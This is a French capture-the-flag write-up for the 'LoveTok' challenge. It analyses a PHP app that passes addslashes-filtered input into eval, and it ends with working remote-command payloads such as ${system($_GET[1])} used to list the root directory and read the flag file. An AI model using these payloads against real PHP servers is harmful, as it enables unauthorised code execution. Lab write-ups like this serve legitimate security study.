\section{LoveTok}
Keywords: PPH, addslashes, eval
\section{Analyse}

le flag se trouve à la racine avec un nom aléatoire. Ca veut donc dire faire du
directory traversal ou du reverseshell

\verb+php7.4-fpm+

\verb+?format=r+

\subsection{TimeContoller}
\begin{verbatim}
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : 'r';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
\end{verbatim}

\subsection{TimeModel}
\begin{verbatim}
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
\end{verbatim}

\verb+addslashes+ :  Returns a string with backslashes added before characters
that need to be escaped. These characters are: \verb+'+, \verb+"+, \verb+\+  and
\verb+NUL+ (the NUL byte)



si on fait de l'url encode

donc il faudrait envoyer \verb+"); $time=system("ls /flag*"); //+

sauf que l'on ne bypass pas \verb+addslashes+

\url{https://www.programmersought.com/article/30723400042/}

\verb+${phpinfo()+

\begin{verbatim}
eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
eval('$time = date("${phpinfo()}", strtotime("+4 day +17 hour +3 minute +11 second"));');

 Undefined variable: 1 in /www/models/TimeModel.php(15) : eval()'d code on line 1" while reading
\end{verbatim}

je ne comprend pas très bien pourqoi cela passe.




\verb-${system($_GET[1])}&1=ls+/-

\verb-${system($_GET[1])}&1=cat+/flagyzbeq-
